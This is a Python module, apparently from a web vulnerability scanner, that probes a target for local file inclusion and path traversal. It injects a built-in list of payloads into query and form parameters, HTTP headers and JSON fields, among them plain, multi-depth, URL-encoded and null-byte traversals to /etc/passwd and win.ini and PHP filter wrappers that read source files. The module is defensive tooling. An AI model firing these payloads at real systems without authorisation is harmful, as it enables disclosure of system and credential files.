"""Path traversal / LFI detection module for Titan Scanner — fully exhausted.

Features:
  1. Multi-OS File Content Markers & Path Traversals:
     • POSIX (/etc/passwd, /etc/hosts, /proc/self/environ, /var/log/apache2/access.log)
     • Windows (C:\\Windows\\win.ini, C:\\Windows\\System32\\drivers\\etc\\hosts, boot.ini)
     • Multi-depth (../../../../, ..\\..\\..\\..\\)
     • URL-encoded (..%2f..%2f, %2e%2e%2f, ..%252f)
     • PHP Wrappers (php://filter/convert.base64-encode/resource=...)
     • Null-byte terminators (%00)
  2. Zero Parameter Whitelisting: tests all query/body parameters.
  3. HTTP Header Injection: tests high-risk headers for file path sinks.
  4. Nested JSON AST Walker: recursively injects into deep API JSON bodies.
  5. Strict Evidence Policy (SCAN-QUALITY M1):
     • Content leak verification only after peeling all payload encodings.
     • Differential filesystem-sink error detection (excluding baseline errors).
     • Zero false positives on reflected query strings or catch-all routes.
"""

from __future__ import annotations

import copy
import json
import random
import string
from typing import Any, Dict, List, Optional, Tuple

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer
from titan.verify.oracles import extract_error_classes, payload_encodings, score_signals


_INJECTABLE_HEADERS_LFI: Tuple[str, ...] = (
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Original-URL",
    "X-Custom-File",
)

_TRAVERSAL_CORE_PROBES: Tuple[str, ...] = (
    # Direct absolute paths
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "/etc/hosts",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    # Relative path traversals
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    # Encoded traversals
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # PHP filter wrapper
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/resource=/etc/passwd",
    # Null-byte
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
)


class LFIDetector:
    """Production-grade LFI detector with exhaustive path traversal coverage."""

    # File *content* markers only — never path strings that the payload itself contains
    CONTENT_MARKERS = [
        "root:x:0:0:", "daemon:x:", "bin:x:", "sys:x:", "nobody:x:",
        "www-data:x:", "0:0:root", "uid=", "[extensions]",
        "extension_dir", "safe_mode", "disable_functions",
        "[fonts]", "[boot loader]", "; for 16-bit app support",
    ]

    # Error classes that prove the parameter reached a filesystem sink
    ALLOWED_ERROR_CLASSES = {"filesystem", "generic", "python", "java"}

    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []

        context_data = {
            "fingerprint": self.fingerprint,
            "attack_type": "lfi",
            "param_type": "path",
            "location": "query" if method == "GET" else "body",
        }

        # Build payload pool
        base_payloads = self.payload_smith.get_base_payloads("lfi", context_data)
        waf = (
            self.payload_smith.detect_waf({}, "", 0)
            or self.fingerprint.get("waf", "unknown")
        )
        if waf and waf != "unknown":
            base_payloads.extend(
                self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf)
            )

        all_payloads = list(dict.fromkeys(list(_TRAVERSAL_CORE_PROBES) + base_payloads))

        # ── Engine 1: Query & Form Parameters (all params, no keyword whitelist) ──
        for param_name in list(params.keys()):
            f = await self._test_param(context, target, method, url, param_name, params, all_payloads)
            if f:
                findings.append(f)

        # ── Engine 2: HTTP Header LFI ─────────────────────────────────
        header_findings = await self._scan_headers(context, target, method, url, params, all_payloads)
        findings.extend(header_findings)

        # ── Engine 3: Nested JSON Body LFI ───────────────────────────
        json_findings = await self._scan_json_body(context, target, method, url, params, all_payloads)
        findings.extend(json_findings)

        return findings

    async def _request(self, context, method: str, url: str, params: Dict[str, str], target: str):
        headers = {"Referer": target}
        if method == "GET":
            return await context.request.get(url, params=params, headers=headers, timeout=3000)
        return await context.request.post(url, data=params, headers=headers, timeout=3000)

    # ------------------------------------------------------------------
    # ENGINE 2 — HTTP HEADER LFI
    # ------------------------------------------------------------------

    async def _scan_headers(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        safe_headers: Dict[str, str] = {"Referer": target}

        try:
            if method == "GET":
                r0 = await context.request.get(url, params=params, headers=safe_headers, timeout=3000)
            else:
                r0 = await context.request.post(url, data=params, headers=safe_headers, timeout=3000)
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        baseline_lower = baseline_body.lower()

        for header_name in _INJECTABLE_HEADERS_LFI:
            for payload in _TRAVERSAL_CORE_PROBES[:3]:
                try:
                    inject_headers = {**safe_headers, header_name: payload}
                    if method == "GET":
                        resp = await context.request.get(url, params=params, headers=inject_headers, timeout=3000)
                    else:
                        resp = await context.request.post(url, data=params, headers=inject_headers, timeout=3000)
                    body = await resp.text()

                    body_peeled = body.lower()
                    for form in payload_encodings(payload):
                        body_peeled = body_peeled.replace(form.lower(), "")

                    leaks = [m for m in self.CONTENT_MARKERS if m.lower() in body_peeled and m.lower() not in baseline_lower]
                    if leaks:
                        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
                        for m in leaks:
                            diffs.append(f"lfi:content:{m}")
                        findings.append(Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=header_name,
                            location="header",
                            payload=payload,
                            attack_type=AttackType.LFI,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=0.95,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                            metadata={"injection_location": "http_header"},
                        ))
                        break
                except Exception:
                    continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 3 — NESTED JSON AST LFI
    # ------------------------------------------------------------------

    async def _scan_json_body(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        if method.upper() == "GET":
            return findings

        body_str = next(iter(params.values()), "") if len(params) == 1 else ""
        if not body_str:
            try:
                body_str = json.dumps(params)
            except Exception:
                return findings

        try:
            tree = json.loads(body_str)
        except (json.JSONDecodeError, TypeError):
            return findings

        leaves = list(self._json_leaves(tree))

        try:
            r0 = await context.request.post(
                url,
                data=json.dumps(tree),
                headers={"Content-Type": "application/json", "Referer": target},
                timeout=3000,
            )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        baseline_lower = baseline_body.lower()

        for path in leaves:
            for payload in _TRAVERSAL_CORE_PROBES[:4]:
                try:
                    mutated = copy.deepcopy(tree)
                    self._json_set(mutated, path, payload)
                    resp = await context.request.post(
                        url,
                        data=json.dumps(mutated),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=3000,
                    )
                    body = await resp.text()

                    body_peeled = body.lower()
                    for form in payload_encodings(payload):
                        body_peeled = body_peeled.replace(form.lower(), "")

                    leaks = [m for m in self.CONTENT_MARKERS if m.lower() in body_peeled and m.lower() not in baseline_lower]
                    if leaks:
                        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
                        for m in leaks:
                            diffs.append(f"lfi:content:{m}")
                        findings.append(Finding(
                            target=target,
                            url=str(resp.url or url),
                            method="POST",
                            param=".".join(str(p) for p in path),
                            location="json_body",
                            payload=payload,
                            attack_type=AttackType.LFI,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=0.92,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                            metadata={"injection_location": "json_ast", "json_path": path},
                        ))
                        break
                except Exception:
                    continue

        return findings

    def _json_leaves(self, node: Any, path: Optional[list] = None):
        if path is None:
            path = []
        if isinstance(node, dict):
            for k, v in node.items():
                yield from self._json_leaves(v, path + [k])
        elif isinstance(node, list):
            for i, v in enumerate(node):
                yield from self._json_leaves(v, path + [i])
        elif isinstance(node, (str, int, float)):
            yield path

    def _json_set(self, tree: Any, path: list, value: Any) -> None:
        node = tree
        for key in path[:-1]:
            node = node[key]
        node[path[-1]] = value

    # ------------------------------------------------------------------
    # CORE PARAM TEST
    # ------------------------------------------------------------------

    async def _test_param(
        self,
        context,
        target: str,
        method: str,
        url: str,
        param_name: str,
        all_params: Dict[str, str],
        payloads: List[str],
    ) -> Optional[Finding]:
        baseline_body = ""
        baseline_status = None

        try:
            baseline_resp = await self._request(context, method, url, all_params, target)
            baseline_body = await baseline_resp.text()
            baseline_status = baseline_resp.status
        except Exception:
            pass
        baseline_lower = baseline_body.lower()

        for payload in payloads:
            try:
                test_params = dict(all_params)
                test_params[param_name] = payload
                resp = await self._request(context, method, url, test_params, target)
                body = await resp.text()

                signals: List[str] = []
                diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)

                # 1. Content leak check: strip payload in ALL encodings before searching
                body_peeled = body.lower()
                for form in payload_encodings(payload):
                    body_peeled = body_peeled.replace(form.lower(), "")

                leaks = [
                    m for m in self.CONTENT_MARKERS
                    if m.lower() in body_peeled and m.lower() not in baseline_lower
                ]
                if leaks:
                    signals.append("content_leak")
                    for m in leaks:
                        diffs.append(f"lfi:content:{m}")

                # 2. Filesystem-sink error check: must be absent from baseline
                baseline_errors = set(extract_error_classes(baseline_body))
                test_errors = set(extract_error_classes(body))
                new_errors = test_errors - baseline_errors

                for ec in new_errors:
                    if ec in self.ALLOWED_ERROR_CLASSES:
                        signals.append(f"error:{ec}")
                        diffs.append(f"lfi:error_class:{ec}")

                if resp.status >= 500:
                    signals.append("status_500")
                if len(body) != len(baseline_body):
                    signals.append("content_change")

                if signals:
                    confidence, verified, _ = score_signals(signals)
                    if confidence >= 0.3:
                        severity = Severity.CRITICAL if verified else Severity.HIGH
                        return Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload,
                            attack_type=AttackType.LFI,
                            severity=severity,
                            verified=verified,
                            confidence=confidence,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                        )
            except Exception:
                continue

        return None



